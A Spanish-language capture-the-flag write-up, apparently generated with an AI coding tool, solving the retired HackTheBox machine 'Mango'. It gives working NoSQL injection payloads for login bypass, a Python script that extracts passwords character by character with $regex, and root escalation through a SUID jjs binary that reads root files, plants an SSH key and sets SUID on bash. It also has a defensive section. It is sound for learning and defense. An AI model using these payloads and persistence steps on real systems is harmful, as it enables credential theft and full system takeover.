---
title: Mango (HackTheBox Medium)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, medium, nosql-injection, mongodb, suid, privesc, gtfobins]
type: nota
status: en-progreso
source: claude-code
aliases: [Mango, HTB Mango, NoSQLi Mango]
---

# Mango — HackTheBox (Medium)

SO: Linux · Dificultad: Medium · Skills: enumeracion de certificados TLS / vhosts, inyeccion NoSQL (MongoDB) por operadores, extraccion ciega con `$regex`, scripting de exfiltracion en Python, escalada por binario SUID (GTFOBins `jjs`).

> Recordatorio etico: HTB es un laboratorio **autorizado y legal**. Todo lo que sigue se hace contra una maquina retirada en un entorno de practica con permiso explicito. No apliques nada de esto fuera de sistemas para los que tengas autorizacion por escrito.

La cadena de Mango es un ejemplo de libro de "la pista esta donde no miras". El recon clasico (22/80/443) parece muerto: el puerto 80 devuelve 403. El truco es leer el **certificado TLS del 443**, cuyo CN/SAN filtra los vhosts `mango.htb` y `staging-order.mango.htb`. El vhost de staging tiene un login vulnerable a **inyeccion NoSQL sobre MongoDB**: primero hacemos *bypass* de autenticacion con el operador `$ne`, y despues **extraemos ciegamente** las contrasenas de los usuarios `admin` y `mango` con `$regex`, caracter a caracter, mediante un script en Python. Con esas credenciales entramos por SSH como `mango`, saltamos a `admin` con `su`, y escalamos a root abusando del binario `jjs` (la shell JavaScript del JDK) que tiene el bit **SUID** activado — una entrada directa de GTFOBins.

## Objetivo

Obtener las dos flags:
- `user.txt` — en el home del usuario `admin` (`/home/admin/user.txt`).
- `root.txt` — en `/root/root.txt`.

Y, mas importante para el aprendizaje: entender el **patron reutilizable** (operador NoSQL no validado por tipo + binario SUID innecesario) y como se defiende.

## Acceso a la maquina (paso previo)

1. Conecta la VPN del laboratorio y **deja la terminal abierta** (la conexion debe persistir):

```bash
sudo openvpn lab_<usuario>.ovpn
```

   Veras lineas terminando en `Initialization Sequence Completed`. Eso indica que el tunel `tun0` esta arriba. Si cierras esa terminal, pierdes el acceso.

2. En el portal de HTB pulsa **Spawn Machine**. Te dara una IP del rango retirado `10.10.10.x`. Sustituye `<IP>` por ella en todo el documento.

3. Comprueba conectividad:

```bash
ping -c2 <IP>
```

   Esperado: `2 packets transmitted, 2 received`. Si hay `100% packet loss`, revisa que la VPN siga conectada y que estes usando la IP correcta. Algunas maquinas Windows bloquean ICMP, pero Mango (Linux) responde.

> Nota: las maquinas **retiradas** requieren suscripcion **VIP**. Si usas **Pwnbox**, ya viene conectada a la VPN; salta el paso 1.

## Reconocimiento

Categoria: **escaneo de puertos y deteccion de servicios**. Hipotesis inicial: ninguna; queremos el mapa completo de la superficie de ataque, sin asumir que los puertos "interesantes" son los primeros 1000.

```bash
nmap -sC -sV -p- -oN nmap.txt <IP>
```

- `-p-` escanea los **65535** puertos TCP (no solo el top 1000). Imprescindible: muchas medium esconden servicios en puertos altos.
- `-sV` detecta version del servicio (banner grabbing + sondas).
- `-sC` lanza los scripts NSE por defecto (`default` category): http-title, ssl-cert, etc. **Aqui esta la clave**, porque `ssl-cert` nos dara el certificado.
- `-oN nmap.txt` guarda salida en formato normal.

Salida esperada (resumida, lo relevante):

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu ...
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
| ssl-cert: Subject: commonName=staging-order.mango.htb/...
| Subject Alternative Name: DNS:mango.htb
|_http-title: Mango | Search Base
```

Que buscar e interpretar:
- **22/tcp SSH**: posible via de entrada **si** conseguimos credenciales. No es atacable directamente; lo tenemos en cuenta para mas tarde.
- **80/tcp HTTP**: devuelve **403 Forbidden**. Pista clasica de **virtual hosting**: el servidor solo sirve contenido si recibes la cabecera `Host:` correcta. El 403 no es un callejon sin salida, es una invitacion a descubrir el vhost.
- **443/tcp HTTPS**: aqui sale la joya. El campo `commonName` del certificado es `staging-order.mango.htb` y el **Subject Alternative Name (SAN)** lista `mango.htb`. **Los certificados TLS filtran nombres de host internos constantemente.** Apuntalo: tenemos dos vhosts.

Si tu `nmap -sC` no mostrara bien el certificado, sacalo a mano (alternativa util de memorizar):

```bash
openssl s_client -connect <IP>:443 2>/dev/null | openssl x509 -noout -text | grep -A2 -i "subject\|alternative"
```

## Enumeracion

### 1. Resolver los vhosts via /etc/hosts

Categoria: **virtual host routing**. El navegador/curl necesita resolver `mango.htb` y `staging-order.mango.htb` a la IP de la maquina para que Apache sirva el vhost correcto. Como no hay DNS, lo hacemos en `/etc/hosts`.

```bash
echo "<IP> mango.htb staging-order.mango.htb" | sudo tee -a /etc/hosts
```

Verifica:

```bash
ping -c1 mango.htb
```

Debe resolver a `<IP>`.

### 2. Comparar los tres "sitios"

```bash
curl -sk -o /dev/null -w "%{http_code}\n" https://<IP>/
curl -sk -o /dev/null -w "%{http_code}\n" https://mango.htb/
curl -sk -o /dev/null -w "%{http_code}\n" https://staging-order.mango.htb/
```

(`-s` silencioso, `-k` ignora el cert autofirmado, `-w "%{http_code}"` imprime solo el codigo.)

Esperado e interpretacion:
- `https://mango.htb/` -> **200**: pagina principal "Mango | Search Base", un clon visual de un buscador. Suele no tener nada explotable directo (un buscador maquetado). Explorala, pero no es el camino.
- `https://staging-order.mango.htb/` -> **200**: aqui aparece un **formulario de login** (campos username/password). Un entorno de **staging** = menos endurecido, ideal para atacar. **Este es el objetivo.**
- El acceso por IP cruda sigue 403 (sin Host valido).

> Truco: lanza tambien un `gobuster`/`feroxbuster` sobre `staging-order.mango.htb` por completitud, pero el login de la home ya es el vector.

### 3. Analizar el login

Abre `https://staging-order.mango.htb/` en navegador (Burp proxy delante si quieres ver la peticion). Es un POST con dos campos. Captura la peticion. La aplicacion esta en PHP y consulta una base **MongoDB** por detras (lo confirmaremos por el comportamiento ante operadores; el nombre "Mango" ~ "Mongo" es el guino).

Hipotesis: si el backend construye la query Mongo a partir del array de POST sin castear tipos, sera vulnerable a **inyeccion NoSQL por operadores**.

## Acceso inicial (foothold)

Categoria de vulnerabilidad: **NoSQL Injection (MongoDB)**. El backend probablemente hace algo como:

```php
$query = ["username" => $_POST['username'], "password" => $_POST['password']];
$user = $collection->findOne($query);
```

El fallo: PHP convierte `username[$ne]=1` en un **array** `["$ne" => "1"]`, y al meterlo en la query Mongo se interpreta como el **operador** `$ne` (not equal). El input deja de ser un valor y pasa a ser logica de consulta. **No se valida el tipo.**

### Paso 1 — Bypass de autenticacion con `$ne`

La query `{username: {$ne: "1"}, password: {$ne: "1"}}` significa "donde username != 1 Y password != 1", que es cierto para cualquier usuario real -> devuelve un usuario y nos loguea.

```bash
curl -sk -i https://staging-order.mango.htb/ \
  --data "username[\$ne]=1&password[\$ne]=1&login=login"
```

Que buscar en la salida:
- Un **302 Redirect** a algo como `home.php` (o un `Set-Cookie` de sesion), en vez de recargar el login. Eso confirma el bypass: **estamos dentro** (probablemente como el primer usuario que matchea).
- Trampa: el nombre exacto del campo del boton (`login=login`) y el `Content-Type` (`application/x-www-form-urlencoded`) importan. En Burp es trivial; con curl, recuerda escapar el `$` (`\$ne`).

Variante: forzar un usuario concreto con `username=admin&password[$ne]=1`. Util para confirmar que `admin` existe.

Esto nos da acceso a la app, pero **lo valioso son las credenciales**, porque queremos SSH (shell de verdad) y reutilizar passwords.

### Paso 2 — Extraccion ciega con `$regex`

Categoria: **blind NoSQL injection (boolean-based)**. No vemos las contrasenas, pero podemos preguntar "¿la password de admin empieza por `^a`?". Si la app responde distinto cuando la condicion es verdadera (p.ej. redirige/loguea) que cuando es falsa (recarga el login), tenemos un **oraculo booleano**.

El operador `$regex` permite probar prefijos:

```
username=admin&password[$regex]=^a    -> ¿empieza por 'a'?
username=admin&password[$regex]=^ab   -> ¿empieza por 'ab'?  (cuando 'a' dio TRUE)
...
username=admin&password[$regex]=^abc$ -> ¿es exactamente 'abc'? (terminamos)
```

Iterando el alfabeto en cada posicion reconstruimos la contrasena entera. Lo mismo para `username=mango`.

> Importante: escapa metacaracteres regex (`.`, `+`, `$`, `\`, etc.) cuando los pruebes como literal, o `$regex` los interpretara mal. Un buen script los maneja.

#### Script de exfiltracion (Python + requests)

Que hace por dentro: por cada usuario, recorre posiciones; en cada posicion prueba cada caracter del charset con un regex anclado `^<conocido><c>`; si la respuesta indica login correcto (oraculo), fija ese caracter y avanza. Termina cuando ningun caracter extiende -> tenemos la password completa.

```python
import requests, urllib3, string
urllib3.disable_warnings()

URL = "https://staging-order.mango.htb/"
# Charset tipico de estas passwords; amplialo si no avanza.
CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()-_=+/.,"
USERS = ["admin", "mango"]

def is_true(username, regex):
    # POST con password como operador $regex. login=login replica el form.
    data = {
        "username": username,
        "password[$regex]": "^" + regex + "$" if False else "^" + regex,
        "login": "login",
    }
    r = requests.post(URL, data=data, verify=False, allow_redirects=False)
    # ORACULO: ajustar a la maquina viva. Si TRUE redirige (302) y FALSE
    # recarga el login (200), usa el status. Si no, busca un marcador en r.text.
    return r.status_code == 302  # <-- VERIFICAR contra la maquina

def escape(c):
    # escapar metacaracteres de regex para tratarlos como literal
    return "\\" + c if c in "\\^$.|?*+()[]{}" else c

def extract(username):
    found = ""
    while True:
        for c in CHARSET:
            if is_true(username, found + escape(c)):
                found += c
                print(f"[{username}] {found}")
                break
        else:
            # ningun caracter extiende -> password completa
            return found

for u in USERS:
    print(f"== {u} -> {extract(u)} ==")
```

Notas didacticas:
- **El oraculo es lo critico.** Antes de lanzar el bucle, manda a mano una condicion que sepas verdadera y otra falsa, y observa la diferencia (status code, longitud del body, presencia de cierta cadena). Ajusta `is_true()` a esa senal real. Es el error #1 de la gente.
- Alternativa sin escribir codigo: **NoSQLMap** o herramientas dedicadas, pero entender el script es justo el aprendizaje que buscamos. Tambien puedes hacerlo a mano con Burp Intruder (payload por posicion), mas lento.
- El charset: si el script se atasca, amplialo (algunos caracteres especiales). Para chars como `.` recuerda escaparlos.

Resultado: dos contrasenas, una para `mango` y otra para `admin` (no las invento: el script te las devuelve contra la maquina; refierete a ellas como `<pass_mango>` y `<pass_admin>`).

### Paso 3 — SSH como mango

Reutilizamos credenciales (los users del login = users del sistema, patron habitual):

```bash
ssh mango@<IP>
# password: <pass_mango>
```

Esperado: prompt `mango@mango:~$`. Estamos dentro con shell real. (La password de `admin` que extrajimos tipicamente **no** funciona para SSH directo de admin por configuracion `AllowUsers`/permisos — por eso saltamos via `su`.)

## Shell estable

Como entramos por **SSH**, ya tenemos una TTY interactiva completa (no es una webshell ciega). Aun asi, salta a `admin`, que es quien tiene `user.txt`:

```bash
su - admin
# password: <pass_admin>
```

Esperado: `admin@mango:~$`. Si la password no funciona, vuelve al script: probablemente el charset estaba incompleto o el oraculo daba falsos negativos en el ultimo caracter.

Si en algun punto tuvieras una shell no-tty (p.ej. via RCE en otra ruta), el patron para estabilizar es:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Esto te da control de trabajos, autocompletado y Ctrl+C sin matar la sesion. En Mango con SSH no hace falta, pero es el reflejo a tener siempre.

## Escalada de privilegios

### Enumeracion como usuario

Categoria de busqueda: **binarios SUID**. El bit SUID hace que un binario se ejecute con los privilegios de su **propietario** (a menudo root), no del que lo lanza. Si ese binario permite ejecutar codigo o leer ficheros arbitrarios, es root.

```bash
find / -perm -4000 -type f 2>/dev/null
```

- `-perm -4000` = bit SUID activado.
- `2>/dev/null` descarta los `Permission denied` (ruido).

Que buscar en la salida: lo habitual (`passwd`, `sudo`, `mount`, etc., todos esperados) **y** algo anomalo:

```
/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

`jjs` SUID **no es normal**. `jjs` es la **shell JavaScript del JDK** (motor Nashorn). Con SUID root, todo lo que ejecutes via `jjs` corre como root. Esto es una entrada directa de **GTFOBins**.

Confirmacion rapida:

```bash
ls -la /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
# -rwsr-sr-x ... root root ... jjs   <-- la 's' confirma SUID/SGID
```

### Vector: abuso de `jjs` (GTFOBins)

`jjs` puede invocar APIs Java (`java.io`, `java.lang.Runtime`) desde JS. Como corre como root, podemos:

**Opcion A — leer root.txt directamente** (la mas limpia, sin tocar nada):

```bash
echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("/root/root.txt"));
var line; while ((line = br.readLine()) != null) { print(line); }' | jjs
```

Esperado: imprime `<flag>` (el contenido de `/root/root.txt`). Esto **lee** como root sin modificar el sistema.

**Opcion B — escribir nuestra clave SSH en /root** (te da shell root persistente). Patron GTFOBins de escritura:

```bash
echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw = new FileWriter("/root/.ssh/authorized_keys");
fw.write("ssh-ed25519 AAAA...tu_clave_publica...");
fw.close();' | jjs
```

Luego `ssh root@<IP>` con tu clave privada. (Requiere que exista `/root/.ssh/`; si no, crealo via `Runtime.exec` primero.)

**Opcion C — ejecutar un comando como root** (p.ej. SUID a bash, o un reverse shell). Patron `Runtime.exec` de GTFOBins:

```bash
echo 'Java.type("java.lang.Runtime").getRuntime().exec("chmod u+s /bin/bash");' | jjs
# luego:
/bin/bash -p   # -p preserva el euid root
```

> Trampa de `jjs`: cuando lo lanzas y escribes interactivamente, a veces se queja con un `Warning: nashorn engine is planned to be removed...` y el prompt `jjs>` se comporta raro con el heredoc. Por eso es mas fiable **pipear el script por stdin** (`echo '...' | jjs`) que escribirlo a mano. Si usas el modo interactivo, recuerda terminar con `\n`.

Opcion recomendada para la flag: **A** (lee y muestra root.txt sin alterar la maquina; lo mas etico y limpio en un lab). Si quieres shell root real, **C**.

## Flags

```bash
# user.txt (como admin)
cat /home/admin/user.txt

# root.txt (via jjs, sin necesidad de shell root) — Opcion A de arriba
echo 'var br=new (Java.type("java.io.BufferedReader"))(new (Java.type("java.io.FileReader"))("/root/root.txt")); var l; while((l=br.readLine())!=null) print(l);' | jjs
```

- `user.txt` -> en `/home/admin/user.txt` (32 hex). La lees como `admin`.
- `root.txt` -> en `/root/root.txt`. La lees como root (via `jjs`) o con `cat` si hiciste la Opcion C.

Pega cada `<flag>` en el panel de HTB para puntuar.

## Patron y teoria

Lo reutilizable de esta maquina (el verdadero objetivo del writeup):

1. **El certificado TLS es superficie de recon.** CN y SAN filtran vhosts/hostnames internos. Cuando 80 da 403 y 443 esta abierto, **lee el certificado** (`nmap --script ssl-cert`, `openssl s_client`). Patron: 403/404 por IP cruda => sospecha de **virtual hosting** => descubre el `Host:` correcto. Ver [[04-seguridad-web-owasp]].

2. **NoSQL Injection por operadores (MongoDB).** Causa raiz: el backend pasa **input no tipado** del usuario directamente a la query. PHP/Express convierten `param[$ne]=1` en un objeto `{"$ne":"1"}` que Mongo interpreta como **logica**, no como dato. Dos modos:
   - *Bypass de auth*: `{$ne: null}` / `{$ne: 1}` hace la condicion siempre verdadera.
   - *Exfiltracion ciega boolean-based*: `$regex` con prefijos anclados (`^...`) + un **oraculo** (diferencia observable entre TRUE/FALSE) reconstruye secretos caracter a caracter. Es el analogo NoSQL del blind SQLi. Misma familia mental: [[04-seguridad-web-owasp]].

3. **Binario SUID peligroso = root.** Patron de privesc de Linux: `find / -perm -4000 -type f`, comparar con lo "normal", y cruzar lo anomalo con **GTFOBins**. `jjs` (y cualquier interprete: `python`, `perl`, `vim`, `find`, `awk`...) con SUID = ejecucion de codigo como owner. Ver [[06-seguridad-de-sistemas-y-hardening]] y [[13-herramientas-en-detalle]] (GTFOBins, LinPEAS).

### Como se defiende / disena (dev / purple team)

- **Validar y castear el tipo de entrada.** El login solo debe aceptar `username` y `password` como **string**. En PHP: `if (!is_string($_POST['username'])) reject;`. En Mongoose: definir esquema estricto y usar `$eq` explicito / sanitizar (`mongo-sanitize` elimina claves que empiezan por `$`). La regla general: **nunca pases un objeto controlado por el usuario como query.**
- **No exponer entornos de staging** sin auth/segmentacion; un staging menos endurecido fue la puerta.
- **No filtrar hostnames en certificados** publicos si son internos (o asumir que se filtraran y endurecerlos igual).
- **Minimizar SUID.** `jjs` (un interprete completo) jamas debe tener SUID root. Auditar con `find / -perm -4000` en hardening; eliminar bits innecesarios (`chmod u-s`). Aplicar principio de **menor privilegio** y AppArmor/SELinux.
- **Rate limiting / deteccion** en el login: un ataque `$regex` genera **miles** de peticiones por usuario. WAF y rate limit lo cortan y lo hacen visible en logs.

## Trampas y errores comunes

1. **No leer el certificado** y quedarse atascado en el 403 del puerto 80. El 403 no es el final: es "te falta el vhost". Siempre `ssl-cert` + revisar CN/SAN.
2. **Olvidar /etc/hosts** o ponerlo mal. Sin la entrada, `staging-order.mango.htb` no resuelve y curl/navegador fallan o caen al vhost por defecto (403). Verifica con `ping mango.htb`.
3. **Oraculo mal calibrado en el script.** Si `is_true()` no refleja la senal real (status, longitud, marcador en body) de la maquina viva, sacaras passwords corruptas o el bucle no avanzara. **Calibra a mano TRUE vs FALSE antes de automatizar.** Tambien: escapar metacaracteres regex y un charset suficientemente amplio.
4. **Confundir credenciales / cuentas.** La pass de `admin` no suele valer para SSH directo; entra por `mango` y haz `su - admin`. Y no mezcles cual password es de cual usuario.
5. **`jjs` interactivo se atasca** (warnings de Nashorn, heredoc raro). Pipea el script por stdin (`echo '...' | jjs`). Y asegurate de usar las clases Java completas (`Java.type("...")`).

## Conexiones

- [[HTB_Medium/00_README]]
- [[MOC_Ciberseguridad]]
- [[HTB_Easy/00_README]] (el paso anterior, nivel Easy)
- [[12-aprender-y-carrera]]
- [[04-seguridad-web-owasp]] (inyeccion NoSQL, blind injection, vhosts)
- [[06-seguridad-de-sistemas-y-hardening]] (SUID, menor privilegio, GTFOBins como defensa)
- [[13-herramientas-en-detalle]] (nmap NSE ssl-cert, openssl s_client, GTFOBins, LinPEAS, Burp Intruder)
